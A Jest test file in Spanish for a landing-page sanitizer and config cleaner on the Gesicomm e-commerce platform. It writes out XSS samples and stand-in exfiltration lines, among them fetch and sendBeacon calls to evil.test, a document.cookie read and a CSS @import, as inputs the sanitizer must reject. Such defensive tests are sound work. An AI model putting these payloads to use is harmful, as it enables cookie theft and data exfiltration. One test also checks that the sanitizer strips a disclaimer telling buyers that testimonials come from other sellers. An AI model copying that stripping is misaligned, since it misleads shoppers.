/**
 * Sanitizador del lienzo en blanco (services/landingCodigo.service.js).
 * Test puro: no toca la base ni levanta el servidor — es la única pieza
 * del modo código que decide qué se guarda, así que conviene tenerla
 * cubierta sola.
 */

const LandingCodigoService = require('../services/landingCodigo.service');

describe('LandingCodigoService.sanitizar', () => {

  describe('HTML', () => {
    it('conserva el marcado normal de una landing', () => {
      const html = '<section class="hero" data-anim="fade"><h1>Hola</h1><p>Texto</p>'
        + '<a class="cta" href="https://gesicomm.com">Comprar</a>'
        + '<img src="https://cdn.test/foto.jpg" alt="foto" loading="lazy"></section>';
      const { html: limpio, advertencias } = LandingCodigoService.sanitizar({ html });
      expect(limpio).toContain('class="hero"');
      expect(limpio).toContain('data-anim="fade"');
      expect(limpio).toContain('href="https://gesicomm.com"');
      expect(limpio).toContain('src="https://cdn.test/foto.jpg"');
      expect(advertencias).toHaveLength(0);
    });

    it('rechaza un <script> embebido si usa JavaScript prohibido', () => {
      expect(() => LandingCodigoService.sanitizar({
        html: '<div>ok</div><script>alert(document.cookie)</script>',
      })).toThrow('Validación fallida.');
    });

    // Ver el CONTRATO en la cabecera del servicio: los onclick sobreviven
    // porque el HTML solo se renderiza dentro del iframe sandbox, y sin
    // ellos no funciona ninguna plantilla pegada de afuera.
    it('conserva atributos de evento inline', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<button onclick="siguiente()" onmouseover="resaltar()">Click</button>',
      });
      expect(html).toBe('<button onclick="siguiente()" onmouseover="resaltar()">Click</button>');
    });

    it('aplica el blocklist del JS también a los atributos de evento', () => {
      expect(() => LandingCodigoService.sanitizar({
        html: `<button onclick="fetch('//evil')">x</button>`,
      })).toThrow('Validación fallida.');

      try {
        LandingCodigoService.sanitizar({ html: '<div onload="document.cookie">x</div>' });
        throw new Error('debió lanzar');
      } catch (err) {
        expect(err.errores.join(' ')).toMatch(/atributo de evento/i);
      }
    });

    it('descarta href javascript: pero deja mailto/tel', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<a href="javascript:alert(1)">a</a><a href="mailto:h@x.com">b</a><a href="tel:+595981000000">c</a>',
      });
      expect(html).not.toContain('javascript:');
      expect(html).toContain('mailto:h@x.com');
      expect(html).toContain('tel:+595981000000');
    });

    it('permite embeber YouTube pero no un iframe de cualquier host', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<iframe src="https://www.youtube.com/embed/abc"></iframe><iframe src="https://phishing.test/x"></iframe>',
      });
      expect(html).toContain('https://www.youtube.com/embed/abc');
      expect(html).not.toContain('phishing.test');
    });

    it('conserva SVG inline', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: '<svg viewBox="0 0 24 24" fill="none"><path d="M4 4h16" stroke="currentColor"/></svg>',
      });
      expect(html).toContain('<svg');
      expect(html).toContain('d="M4 4h16"');
    });

    it('quita avisos/disclaimers visibles generados por IA dentro de la landing', () => {
      const { html } = LandingCodigoService.sanitizar({
        html: `
          <section><h1>AdelFit</h1></section>
          <div class="ai-warning">
            <span>i</span>
            <p>Las experiencias mostradas fueron publicadas por comercios que comercializan AdelFit y no corresponden necesariamente a compradores de esta tienda. Los resultados individuales pueden variar.</p>
          </div>
          <section><button data-gesicomm-comprar>Comprar</button></section>
        `,
      });
      expect(html).toContain('AdelFit');
      expect(html).toContain('data-gesicomm-comprar');
      expect(html).not.toMatch(/experiencias mostradas/i);
      expect(html).not.toMatch(/resultados individuales/i);
    });

    it('rechaza un HTML por encima del límite de tamaño', () => {
      const gigante = '<p>x</p>'.repeat(LandingCodigoService.MAX_HTML);
      expect(() => LandingCodigoService.sanitizar({ html: gigante }))
        .toThrow('Validación fallida.');
    });
  });

  describe('CSS', () => {
    it('deja pasar CSS normal, incluido url() de imágenes y fuentes', () => {
      const css = '.hero { background: url(https://cdn.test/bg.jpg) center/cover; }\n'
        + '@media (max-width: 600px) { .hero { padding: 16px; } }';
      const { css: limpio, advertencias } = LandingCodigoService.sanitizar({ css });
      expect(limpio).toBe(css);
      expect(advertencias).toHaveLength(0);
    });

    it('quita @import, expression() y url(javascript:)', () => {
      const { css, advertencias } = LandingCodigoService.sanitizar({
        css: '@import url("//evil.test/x.css");\nbody { color: red; }\n.a { width: expression(alert(1)); }\n.b { background: url(javascript:alert(1)); }',
      });
      expect(css).toContain('body { color: red; }');
      expect(css).not.toMatch(/@import/i);
      expect(css).not.toMatch(/expression\s*\(/i);
      expect(css).not.toMatch(/javascript:/i);
      expect(advertencias.length).toBeGreaterThanOrEqual(3);
    });

    it('permite scroll-behavior pero sigue quitando la propiedad behavior peligrosa', () => {
      const { css, advertencias } = LandingCodigoService.sanitizar({
        css: 'html { scroll-behavior: smooth; }\n.ie { behavior: url(x.htc); }',
      });
      expect(css).toContain('scroll-behavior: smooth');
      expect(css).not.toContain('url(x.htc)');
      expect(advertencias.join(' ')).toMatch(/behavior:/);
    });

    it('no deja cerrar el <style> del documento', () => {
      const { css } = LandingCodigoService.sanitizar({
        css: 'body{color:red}\n</style><script>alert(1)</script>',
      });
      expect(css).not.toMatch(/<\s*\/?\s*(style|script)/i);
    });
  });

  describe('JavaScript', () => {
    it('acepta el JS típico de una landing', () => {
      const js = [
        "document.querySelectorAll('.faq-item').forEach((el) => {",
        "  el.addEventListener('click', () => el.classList.toggle('abierto'));",
        '});',
      ].join('\n');
      const resultado = LandingCodigoService.sanitizar({ js });
      expect(resultado.js).toBe(js);
      expect(resultado.advertencias).toHaveLength(0);
    });

    it.each([
      ['document.cookie', 'const c = document.cookie;'],
      ['localStorage', "localStorage.setItem('a', 1);"],
      ['parent', "window.parent.location = 'https://evil.test';"],
      ['fetch', "fetch('https://evil.test', { method: 'POST' });"],
      ['XMLHttpRequest', 'new XMLHttpRequest();'],
      ['eval', "eval('alert(1)');"],
      ['new Function', "new Function('alert(1)')();"],
      ['sendBeacon', "navigator.sendBeacon('https://evil.test', 'x');"],
      ['document.write', "document.write('<h1>x</h1>');"],
      ['postMessage', "postMessage('x', '*');"],
    ])('rechaza el guardado si el JS usa %s', (_etiqueta, js) => {
      expect(() => LandingCodigoService.sanitizar({ js })).toThrow('Validación fallida.');
    });

    it('no rechaza palabras prohibidas cuando aparecen solo dentro de comentarios', () => {
      const js = [
        '/*',
        '  No usamos fetch.',
        '  No usamos localStorage.',
        '*/',
        "document.querySelector('button')?.addEventListener('click', () => console.log('ok'));",
      ].join('\n');

      expect(() => LandingCodigoService.sanitizar({ js })).not.toThrow();
    });

    it('el error lista cada motivo, para poder mostrarlos en el editor', () => {
      try {
        LandingCodigoService.sanitizar({ js: "fetch('/x'); document.cookie;" });
        throw new Error('debió lanzar');
      } catch (err) {
        expect(err.errores).toHaveLength(2);
        expect(err.errores.join(' ')).toMatch(/fetch/);
        expect(err.errores.join(' ')).toMatch(/document\.cookie/);
      }
    });
  });

  // El caso real: el comercio pega una plantilla entera en la pestaña
  // HTML. Antes quedaba una landing muerta — el <style> y el <script> se
  // descartaban y sobrevivía solo el marcado pelado.
  describe('documento HTML completo pegado en la pestaña HTML', () => {
    const documento = [
      '<!DOCTYPE html>',
      '<html lang="es"><head>',
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">',
      '<style>:root { --radius: 26px; } .hero { min-height: 100vh; }</style>',
      '</head><body>',
      '<section class="hero"><h1>Hola</h1></section>',
      '<button onclick="siguiente()">Siguiente</button>',
      '<script>function siguiente() { console.log(1); }</script>',
      '</body></html>',
    ].join('\n');

    it('reparte <style> y <script> en sus campos y deja solo el <body>', () => {
      const r = LandingCodigoService.sanitizar({ html: documento });
      expect(r.html).not.toMatch(/<!doctype|<html[\s>]|<head[\s>]|<style|<script/i);
      expect(r.html).toContain('<section class="hero">');
      expect(r.css).toContain('--radius: 26px');
      expect(r.js).toContain('function siguiente()');
      expect(r.advertencias.join(' ')).toMatch(/página completa/i);
    });

    // El <link> no puede quedar en el HTML (Gesicomm inyecta las fuentes en
    // el <head> del iframe), pero la fuente tampoco se pierde: sale por el
    // campo `fonts`, que es de donde las toma construirDocumentoCodigo.
    it('rescata el <link> del <head> para no perder la fuente', () => {
      const { html, fonts } = LandingCodigoService.sanitizar({ html: documento });
      expect(html).not.toContain('<link');
      expect(fonts).toContain('https://fonts.googleapis.com/css2?family=Inter');
    });

    it('suma lo extraído DESPUÉS de lo que ya había en css/js', () => {
      const r = LandingCodigoService.sanitizar({
        html: documento,
        css: 'body { background: #000; }',
        js: 'const inicial = 1;',
      });
      expect(r.css.indexOf('background: #000')).toBeLessThan(r.css.indexOf('--radius'));
      expect(r.js.indexOf('const inicial')).toBeLessThan(r.js.indexOf('function siguiente'));
    });

    it('también reparte un fragmento largo con <style> y <script> embebidos', () => {
      const r = LandingCodigoService.sanitizar({
        html: [
          '<section class="hero"><h1>Hola</h1></section>',
          '<style>.hero { color: green; }</style>',
          '<script>document.querySelector(".hero")?.classList.add("ok");</script>',
        ].join('\n'),
      });

      expect(r.html).toContain('<section class="hero">');
      expect(r.html).not.toMatch(/<style|<script/i);
      expect(r.css).toContain('.hero { color: green; }');
      expect(r.js).toContain('classList.add("ok")');
      expect(r.advertencias.join(' ')).toMatch(/HTML con bloques embebidos/i);
    });

    it('descarta <script src> externo y lo avisa', () => {
      const r = LandingCodigoService.sanitizar({
        html: '<html><body><p>x</p><script src="https://cdn.test/a.js"></script></body></html>',
      });
      expect(r.js).toBe('');
      expect(r.advertencias.join(' ')).toMatch(/script src/i);
    });

    it('no toca un fragmento normal (sin doctype/html/body)', () => {
      const r = LandingCodigoService.sanitizar({ html: '<section><h1>Hola</h1></section>' });
      expect(r.html).toBe('<section><h1>Hola</h1></section>');
      expect(r.advertencias).toHaveLength(0);
    });
  });

  it('rechaza un código que no sea un objeto {html, css, js}', () => {
    expect(() => LandingCodigoService.sanitizar('<h1>x</h1>')).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar(null)).toThrow('Validación fallida.');
    expect(() => LandingCodigoService.sanitizar([])).toThrow('Validación fallida.');
  });

  /**
   * El Page Builder reutiliza este mismo sanitizador con límites propios,
   * más altos (ver builderPageVersion.service.js). Estos tests fijan el
   * contrato de esa extensión: llamarlo SIN opciones tiene que seguir
   * comportándose exactamente como antes, o la extensión habría cambiado
   * en silencio el comportamiento de las landings.
   */
  describe('límites por parámetro (contrato con el Page Builder)', () => {

    it('sin opciones usa los límites de una landing, como siempre', () => {
      const html = `<p>${'a'.repeat(LandingCodigoService.MAX_HTML)}</p>`;
      expect(() => LandingCodigoService.sanitizar({ html }))
        .toThrow('Validación fallida.');
    });

    it('con un límite más alto, ese mismo HTML entra', () => {
      const html = `<p>${'a'.repeat(LandingCodigoService.MAX_HTML)}</p>`;
      const r = LandingCodigoService.sanitizar({ html }, { maxHtml: 500 * 1024 });
      expect(r.html).toContain('<p>');
    });

    it('el tope total corta aunque cada campo entre en el suyo', () => {
      expect(() => LandingCodigoService.sanitizar(
        { html: `<p>${'a'.repeat(60 * 1024)}</p>`, css: `/*${'b'.repeat(60 * 1024)}*/` },
        { maxTotal: 100 * 1024 },
      )).toThrow('Validación fallida.');
    });

    it('devuelve el tamaño en bytes de lo que quedó', () => {
      const r = LandingCodigoService.sanitizar({ html: '<p>hola</p>', css: 'p{color:red}' });
      expect(r.bytes).toBe(
        Buffer.byteLength(r.html, 'utf8')
        + Buffer.byteLength(r.css, 'utf8')
        + Buffer.byteLength(r.js, 'utf8'),
      );
    });
  });
});

describe('Runtime de Gesicomm en el HTML', () => {
  it('conserva los <template> de las listas y sanea lo que tienen adentro', () => {
    const html = '<div data-gesicomm-lista="productos"><template><article><h3 data-gesicomm-bind="nombre"></h3>'
      + '<a href="javascript:alert(1)">x</a><script>alert(1)</script></article></template></div>';
    const r = LandingCodigoService.sanitizar({ html, css: '', js: '' });
    expect(r.html).toContain('<template><article><h3 data-gesicomm-bind="nombre"></h3>');
    expect(r.html).not.toContain('javascript:');
    expect(r.html).not.toContain('<script');
  });
});

describe('LandingCodigoService.limpiarVenta', () => {
  it('guarda galerías propias y conserva la lista vacía sin aceptar URLs inseguras', () => {
    const venta = LandingCodigoService.limpiarVenta({ presentacion_productos: {
      'producto:10': { imagenes_landing: ['https://cdn.test/foto.webp', 'javascript:alert(1)', '//externo.test/foto', '/uploads/foto.jpg', 'https://cdn.test/foto.webp'] },
      'combo:15': { imagenes_landing: [] },
      'producto:20': { titulo_comercial: 'Sin galería propia' },
    } });
    expect(venta.presentacion_productos['producto:10'].imagenes_landing).toEqual(['https://cdn.test/foto.webp', '/uploads/foto.jpg']);
    expect(venta.presentacion_productos['combo:15'].imagenes_landing).toEqual([]);
    expect(venta.presentacion_productos['producto:20']).not.toHaveProperty('imagenes_landing');
  });
  it('conserva la presentación comercial por ID entero y limita los textos', () => {
    const venta = LandingCodigoService.limpiarVenta({ presentacion_productos: {
      'producto:1370': { titulo_comercial: 'Cacerola práctica', mensaje_comercial: 'x'.repeat(200), insignia_principal: 'Oferta', insignia_secundaria: 'Exclusivo online', etiqueta: 'No comercial' },
      'combo:15': { titulo_comercial: 'Kit de cocina' },
      'producto:abc': { titulo_comercial: 'Inválido' },
      'producto:0': { titulo_comercial: 'Inválido' },
    } });
    expect(Object.keys(venta.presentacion_productos)).toEqual(['producto:1370', 'combo:15']);
    expect(venta.presentacion_productos['producto:1370']).toEqual({ titulo_comercial: 'Cacerola práctica', mensaje_comercial: 'x'.repeat(160), insignia_principal: 'Oferta', insignia_secundaria: 'Exclusivo online' });
  });
  it('arma la configuración campo por campo y descarta lo que no está en la lista blanca', () => {
    const v = LandingCodigoService.limpiarVenta({
      tipo: 'combos',
      seleccion: 'categoria',
      categorias: ['Cocina', 'Cocina', ' Fitness ', 42],
      cross_sell: { activo: true, ofertas: [3, '4', -1, 'x', 3] },
      destacados: ['adelfit', 'combo-12', 'adelfit', '<script>'],
      recomendados: { modo: 'manual', items: ['air-fryer', '<script>'], max: 20, titulo: 'x'.repeat(200) },
      __proto__hack: true,
    });
    expect(v).toEqual({
      configurado: true,
      tipo: 'combos',
      seleccion: 'categoria',
      categorias: ['Cocina', 'Fitness'],
      incluir_combos: true,
      abrir_en: 'tienda',
      combos_primero: false,
      principal_id: null,
      destacados: ['adelfit', 'combo-12'],
      paquetes: {},
      urgencia: null,
      prueba_social: null,
      cross_sell: { activo: true, ofertas: [3, 4] },
      recomendados: { activo: true, modo: 'manual', items: ['air-fryer'], max: 4, titulo: 'x'.repeat(80) },
      pago_logos: { tarjetas: true, bocas: true, billetera: true },
    });
  });

  it('valores desconocidos caen a los defaults', () => {
    const v = LandingCodigoService.limpiarVenta({ tipo: 'otra', seleccion: 'nada', cross_sell: { activo: false } });
    expect(v.tipo).toBe('catalogo');
    expect(v.seleccion).toBe('manual');
    expect(v.cross_sell.activo).toBe(false);
    expect(LandingCodigoService.limpiarVenta('texto')).toBeNull();
    expect(LandingCodigoService.limpiarVenta([1])).toBeNull();
  });

  it('conserva solamente controles de catálogo conocidos con valores booleanos', () => {
    const v = LandingCodigoService.limpiarVenta({ catalogo_filtros: {
      buscador: false, categoria: true, marca: false, etiqueta: true, precio: true, disponibilidad: false, orden: true,
      inventado: true, color: '<script>',
    } });
    expect(v.catalogo_filtros).toEqual({ buscador: false, categoria: true, marca: false, etiqueta: true, precio: true, disponibilidad: false, orden: true });
    expect(LandingCodigoService.limpiarVenta({ catalogo_filtros: { buscador: 'false' } }).catalogo_filtros).toEqual({});
  });

  it('conserva paquetes ocultos y no deja destacado un paquete desactivado', () => {
    const v = LandingCodigoService.limpiarVenta({
      paquetes: {
        21: { etiqueta: 'Mayor ahorro', destacado: true },
        22: { etiqueta: 'Oculto', destacado: true, activo: false },
      },
    });
    expect(v.paquetes).toEqual({
      21: { etiqueta: 'Mayor ahorro', destacado: true },
      22: { etiqueta: 'Oculto', destacado: false, activo: false },
    });
  });

  it('no guarda `inicio` si no vino nada (compatibilidad con guardados viejos)', () => {
    const v = LandingCodigoService.limpiarVenta({ tipo: 'catalogo' });
    expect(v).not.toHaveProperty('inicio');
    expect(v).not.toHaveProperty('inicio_comercial');
  });

  it('persiste banners, menú y vitrinas del Inicio (antes se perdían al guardar)', () => {
    const v = LandingCodigoService.limpiarVenta({
      inicio: {
        menu_links: [{ texto: 'Inicio', destino: '#inicio', visible: true }, { texto: '', destino: '/x' }],
        menu_categorias: false,
        categorias: ['Cocina', 'Cocina'],
        banners: [{
          id: 'banner-1', activo: true, titulo: 'Hola', subtitulo: 'Sub', etiqueta: 'Nuevo',
          cta_texto: 'Ver más', enlace: '/catalogo', imagen: 'https://cdn.test/b.jpg', tipo_medio: 'imagen',
        }, { titulo: 'Sin imagen segura', imagen: 'javascript:alert(1)', tipo_medio: 'raro' }],
        secciones: [{
          id: 'seccion-1', activo: true, tipo: 'categoria', titulo: 'Cocina', subtitulo: 'Lo mejor',
          categoria: 'Cocina', productos: ['adelfit', '<script>'], limite: 6,
        }, { tipo: 'inventado', productos: [] }],
      },
    });
    expect(v.inicio).toEqual({
      menu_links: [{ texto: 'Inicio', destino: '#inicio', visible: true }],
      menu_categorias: false,
      categorias: ['Cocina'],
      bloques: [],
      anuncios: [],
      confianza: [],
      banners: [
        {
          id: 'banner-1', activo: true, titulo: 'Hola', subtitulo: 'Sub', etiqueta: 'Nuevo',
          cta_texto: 'Ver más', enlace: '/catalogo', imagen: 'https://cdn.test/b.jpg', tipo_medio: 'imagen',
        },
        { activo: true, titulo: 'Sin imagen segura', subtitulo: '', etiqueta: '', cta_texto: '', enlace: '', imagen: '', tipo_medio: 'imagen' },
      ],
      banners_intermedios: [],
      secciones: [
        { id: 'seccion-1', activo: true, tipo: 'categoria', titulo: 'Cocina', subtitulo: 'Lo mejor', categoria: 'Cocina', productos: ['adelfit'], limite: 6 },
        { activo: true, tipo: 'categoria', titulo: '', subtitulo: '', categoria: '', productos: [], limite: 4 },
      ],
    });
    expect(v.inicio_comercial).toEqual(v.inicio);
  });

  it('acepta `inicio_comercial` (nombre legado) cuando no viene `inicio`', () => {
    const v = LandingCodigoService.limpiarVenta({ inicio_comercial: { menu_categorias: false } });
    expect(v.inicio.menu_categorias).toBe(false);
  });

  it('bloques: ordena y oculta solo tipos conocidos, sin duplicados', () => {
    const v = LandingCodigoService.limpiarVenta({
      inicio: {
        bloques: [
          { tipo: 'marca', visible: false },
          { tipo: 'confianza' },
          { tipo: 'inventado', visible: true },
          { tipo: 'marca', visible: true }, // duplicado: se ignora el segundo
        ],
      },
    });
    expect(v.inicio.bloques).toEqual([
      { tipo: 'marca', visible: false },
      { tipo: 'confianza', visible: true },
    ]);
  });

  it('anuncios: acepta strings sueltos (legado) y objetos con ícono, descarta vacíos', () => {
    const v = LandingCodigoService.limpiarVenta({
      inicio: { anuncios: ['Envío gratis', '', { texto: 'x'.repeat(100), icono: 'truck' }, { icono: 'card' }, { texto: 'Pago seguro', icono: '<script>' }] },
    });
    expect(v.inicio.anuncios).toEqual([
      { texto: 'Envío gratis', icono: '' },
      { texto: 'x'.repeat(80), icono: 'truck' },
      { texto: 'Pago seguro', icono: '<script>'.slice(0, 40) },
    ]);
  });

  it('confianza: hasta 3 items con ícono por defecto si falta, descarta los vacíos', () => {
    const v = LandingCodigoService.limpiarVenta({
      inicio: {
        confianza: [
          { icono: 'truck', titulo: 'Envíos', texto: 'A todo el país' },
          { titulo: 'Sin ícono' },
          { icono: 'x' }, // sin título ni texto: se descarta, no cuenta para el tope de 3
          { titulo: 'Tercero', texto: 'Este sí entra' },
          { titulo: 'Cuarto', texto: 'Este no entra, ya hay 3' },
        ],
      },
    });
    expect(v.inicio.confianza).toEqual([
      { icono: 'truck', titulo: 'Envíos', texto: 'A todo el país' },
      { icono: 'shield', titulo: 'Sin ícono', texto: '' },
      { icono: 'shield', titulo: 'Tercero', texto: 'Este sí entra' },
    ]);
  });

  it('marca: solo se guarda si vino el objeto, descarta medios con URL insegura', () => {
    const sinMarca = LandingCodigoService.limpiarVenta({ tipo: 'catalogo' });
    expect(sinMarca).not.toHaveProperty('marca');

    const v = LandingCodigoService.limpiarVenta({
      inicio: {
        marca: {
          activo: true, kicker: 'Conocé', titulo: 'Lo cotidiano', texto: 'Hola',
          badges: ['Utilidad', 'Simplicidad', ''],
          medios: [{ tipo: 'imagen', url: 'https://cdn.test/marca.jpg' }, { tipo: 'video', url: 'javascript:alert(1)' }],
        },
      },
    });
    expect(v.inicio.marca).toEqual({
      activo: true, kicker: 'Conocé', titulo: 'Lo cotidiano', texto: 'Hola',
      badges: ['Utilidad', 'Simplicidad'],
      medios: [{ tipo: 'imagen', url: 'https://cdn.test/marca.jpg' }],
    });
  });

  it('productos_categoria: solo se guarda si vino el objeto, límite entre 1 y 48', () => {
    const v = LandingCodigoService.limpiarVenta({
      inicio: { productos_categoria: { activo: true, titulo: 'Productos', items: ['adelfit', 'combo-1'], limite: 99 } },
    });
    expect(v.inicio.productos_categoria).toEqual({
      activo: true, titulo: 'Productos', kicker: '', subtitulo: '', items: ['adelfit', 'combo-1'], limite: 8,
    });
  });
});
